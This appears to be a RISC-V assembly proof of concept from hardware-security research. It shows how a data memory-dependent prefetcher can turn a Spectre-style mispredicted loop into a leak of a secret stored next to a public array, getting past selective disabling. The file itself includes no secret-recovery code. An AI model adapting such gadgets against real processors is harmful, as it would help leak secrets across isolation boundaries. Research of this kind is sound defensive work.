# this program is a poc to demonstrate how DMPs can be used as spectre gadgets
# this can bypass selective disabling:
# speculation can transiently load secrets while DMPs are enabled => DMP scans the secret and can leak it

# this program contains an array with public data, and right after a secret
# the loop is crafted so that it transiently loads array[8] (the secret) due to branch prediction
# with normal spectre attacks loading an address that stores a secret does not leak the secret, however because of the DMP, the secret can leak

# selective disabling: the program never actively accesses the secret, so selective disabling never disables the DMP here

.globl _start
.data
    .balign 16 # make sure array starts at a new cache block (1 block contains 4 words = 16 bytes)
    array: .word 10, 11, 12, 13, 14, 15, 16, 17 # array takes up 2 cache blocks
    secret: .word 0x800023cf, 0, 0, 0 # one cache block for the secret, located right after the array
    array_size: .word 8

.text
_start:

setup:
    # t0 = index, start at 0
    mv t0, x0

loop:
    # t1 = array[index]
    la t1, array
    slli t2, t0, 2
    add t1, t1, t2
    lw t1, 0(t1)

    # index++
    addi t0, t0, 1

    # t2 = &array_size
    la t2, array_size

    # some code of the loop that so happens to evict array_size from the cache :)
    lw x0, 256(t2)
    lw x0, 512(t2)
    lw x0, 768(t2)
    lw x0, 1024(t2)
    .rept 32
        nop
    .endr

    # t2 = array_size
    lw t2, 0(t2)
    # loop end: jump to loop if index != array_size
    bne t0, t2, loop

finish:
    .rept 128
        nop
    .endr
    lui ra,0x10000
    li sp,4
    sb sp,0(ra)
    .rept 64
        nop
    .endr
